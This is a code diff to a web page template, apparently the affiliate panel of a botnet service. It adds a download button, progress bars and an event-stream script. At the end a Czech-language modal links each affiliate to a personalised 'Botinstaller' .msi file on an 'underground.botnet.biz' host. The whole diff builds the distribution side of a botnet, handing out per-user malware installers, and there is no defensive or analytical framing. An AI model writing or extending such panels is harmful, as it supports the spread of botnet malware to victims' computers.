@@ -44,11 +44,43 @@
 										<div class="text-wrap">
                                                                                     <p>
                                                                                     <center>
-                                                                                        <button type="button" style="height: 200px; width: 500px;"  class="btn btn-success"><i class="fe fe-check mr-2"></i>DOWNLOAD</button>
+                                                                                        <a> <button type="button"  id="downloadBtn" onClick="startTask();" style="height: 200px; width: 500px;"  class="btn btn-success"><i class="fe fe-check mr-2"></i>DOWNLOAD</button></a>
                                                                                     </center>
                                                                                     </p>
 											
 										</div>
+                                                                            
+                                                                                <div id="progress" style="display:none">
+                                                                                    <div class="progress progress-md mb-3">
+                                                                                            <div class="progress-bar progress-bar-indeterminate bg-pink" ></div>
+                                                                                    </div>
+                                                                                    <div class="progress progress-md mb-3">
+                                                                                            <div class="progress-bar progress-bar-indeterminate bg-cyan"></div>
+                                                                                    </div>
+                                                                                    <div class="progress progress-md mb-3">
+                                                                                            <div class="progress-bar progress-bar-indeterminate bg-teal"></div>
+                                                                                    </div>
+                                                                                    <div class="progress progress-md">
+                                                                                            <div class="progress-bar progress-bar-indeterminate bg-purple"></div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            
+                                                                                
+                                                                                <div id="modal" class="modal-dialog" style="display:none;" role="document">
+                                                                                        <div class="modal-content">
+                                                                                                <div class="modal-header">
+                                                                                                        <h5 class="modal-title" id="exampleModalLabel2">Váš download je připraven</h5>
+                                                                                                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                                                                                                <span aria-hidden="true">×</span>
+                                                                                                        </button>
+                                                                                                </div>
+                                                                                                <div class="modal-body">
+                                                                                                    <p>Pro stažení software prosím klikněte <a href="http://underground.botnet.biz/downloads/Botinstaller_{$userId}-1.0.0-64.msi">zde</a></p>
+                                                                                                </div>
+                                                                                
+                                                                                        </div>
+                                                                                </div>
+										
 
 									</div>
 								</div>
@@ -57,6 +89,9 @@
                                             
 					</div>
 {/block}
+
+
+
 
 {block pageScripts}
 
@@ -81,5 +116,40 @@
 
 		<!-- Custom Js-->
 		<script src="{$basePath}/assets/js/custom.js"></script>
+
+                <script>
+                    $("#downloadBtn").click( function (){
+                        $("#downloadBtn").hide();
+                        $("#progress").show();
+                    });
+                </script>
+                
+                <script>
+                    var es;
+
+                    function startTask() {
+                        es = new EventSource({link //Affiliate:download});
+
+                        //a message is received
+                        es.addEventListener('message', function(e) {
+                            var result = JSON.parse( e.data );    
+
+                            if(e.lastEventId == 'CLOSE') {
+                                es.close();
+                                $("#progress").hide();
+                                $("#modal").show()
+                            }
+                        });
+
+                        es.addEventListener('error', function(e) {
+                            es.close();
+                        });
+                    }
+
+                    function stopTask() {
+                        es.close();
+                    }
+
+                </script>
 
 {/block}
